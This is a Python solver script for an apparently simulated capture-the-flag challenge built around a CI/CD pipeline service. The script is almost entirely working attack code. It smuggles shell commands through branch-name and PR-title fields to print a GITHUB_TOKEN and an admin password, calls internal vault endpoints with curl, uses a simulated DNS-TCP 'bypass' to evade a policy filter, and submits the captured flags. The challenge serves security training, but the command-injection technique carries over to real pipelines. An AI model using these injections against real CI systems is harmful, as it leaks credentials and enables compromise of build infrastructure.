#!/usr/bin/env python3
import argparse
import json
import re
import sys
from dataclasses import dataclass

import requests


TEAM_RE = re.compile(r"^[A-Za-z0-9_-]{3,40}$")
FLAG_RE = re.compile(r"FLAG\{[A-Za-z0-9_]+\}")


@dataclass
class SolveResult:
    team: str
    token: str
    user_flag: str
    root_flag: str
    final_flag: str


def _parse_flag(text: str) -> str:
    m = FLAG_RE.search(text or "")
    if not m:
        raise RuntimeError("No FLAG found in text")
    return m.group(0)


def _register(base_url: str, team_name: str):
    res = requests.post(f"{base_url}/api/register", json={"team_name": team_name}, timeout=10)
    if res.status_code == 409:
        raise RuntimeError("Team already exists, use different team name")
    res.raise_for_status()
    data = res.json()
    return data["team"]["api_token"]


def _run(base_url: str, token: str, branch: str, pr_title: str, workflow_body: str):
    res = requests.post(
        f"{base_url}/api/run",
        json={
            "token": token,
            "branch_name": branch,
            "pr_title": pr_title,
            "workflow_body": workflow_body,
        },
        timeout=15,
    )
    res.raise_for_status()
    return res.json()["run_log"]


def solve(base_url: str, team_name: str) -> SolveResult:
    if not TEAM_RE.match(team_name):
        raise RuntimeError("Invalid team_name format")

    token = _register(base_url, team_name)

    # First leak: pipeline token + user flag from branch-name injection (Path A primitive).
    log1 = _run(
        base_url,
        token,
        "release-ready-2026; echo GITHUB_TOKEN=$GITHUB_TOKEN; "
        "curl -s \"http://127.0.0.1:5000/internal/vault/user?token=$GITHUB_TOKEN\"",
        "security patch",
        "echo '[release-note] stable build'",
    )
    if "GITHUB_TOKEN=" not in log1:
        raise RuntimeError("Pipeline token not present in log")
    pipeline_token = log1.split("GITHUB_TOKEN=", 1)[1].splitlines()[0].strip()
    user_flag = _parse_flag(log1)

    # Path B core step: simulated DNS TCP bypass endpoint.
    # Done through branch-name injection to avoid workflow_body policy filter.
    log2 = _run(
        base_url,
        token,
        (
            "dns-bypass-2026; "
            "curl -s -X POST http://127.0.0.1:5000/api/runner/dns-tcp "
            f"-d 'token={pipeline_token}&team_name={team_name}&qname=steal.ops.int'"
        ),
        "runner sidecar",
        "echo '[release] dns check completed'",
    )
    if '"accepted":true' not in log2.replace(" ", "").lower():
        raise RuntimeError("DNS TCP bypass simulation did not succeed")

    # Collect leaked admin pass via PR-title injection.
    log3 = _run(
        base_url,
        token,
        "post-dns-audit",
        "collect-admin; echo ADMIN_PASS=$ADMIN_PASS",
        "echo '[note] post-run audit'",
    )
    if "ADMIN_PASS=" not in log3:
        raise RuntimeError("Admin pass not present in log")
    admin_pass = log3.split("ADMIN_PASS=", 1)[1].splitlines()[0].strip()

    # With admin pass, pull root flag from internal-only endpoint.
    log4 = _run(
        base_url,
        token,
        (
            "collect-root; "
            "curl -s 'http://127.0.0.1:5000/internal/vault/root?password="
            f"{admin_pass}'"
        ),
        "admin check",
        "echo '[release] root access check'",
    )
    root_flag = _parse_flag(log4)

    submit = requests.post(
        f"{base_url}/api/submit",
        json={"token": token, "user_flag": user_flag, "root_flag": root_flag},
        timeout=10,
    )
    submit.raise_for_status()
    submit_data = submit.json()
    if not submit_data.get("solved"):
        raise RuntimeError(f"Submit failed: {json.dumps(submit_data)}")
    final_flag = submit_data["final_flag"]

    return SolveResult(
        team=team_name,
        token=token,
        user_flag=user_flag,
        root_flag=root_flag,
        final_flag=final_flag,
    )


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--team", default="team_dns_2026")
    args = ap.parse_args()
    base_url = args.base_url.rstrip("/")

    try:
        result = solve(base_url, args.team)
    except Exception as exc:
        print(f"[!] Solve B failed: {exc}")
        sys.exit(1)

    print("[+] Method B solve completed")
    print(f"    team: {result.team}")
    print(f"    token: {result.token}")
    print(f"    user_flag: {result.user_flag}")
    print(f"    root_flag: {result.root_flag}")
    print(f"    final_flag: {result.final_flag}")


if __name__ == "__main__":
    main()
